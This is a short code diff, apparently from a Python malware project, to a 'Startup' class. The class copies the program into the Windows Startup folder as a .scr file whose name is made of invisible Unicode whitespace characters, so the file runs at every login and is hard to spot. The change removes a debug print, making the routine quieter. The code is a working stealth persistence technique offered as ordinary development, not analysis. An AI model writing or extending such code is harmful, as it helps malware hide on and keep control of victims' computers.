@@ -9,7 +9,6 @@ class Startup:
         self.startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         while True:
             self.target_path = os.path.join(self.startup_path, "{}.scr".format("".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k=5))))
-            print("Trying target path:", self.target_path)
             if not os.path.exists(self.target_path):
                 break
         self.copy_to_startup()
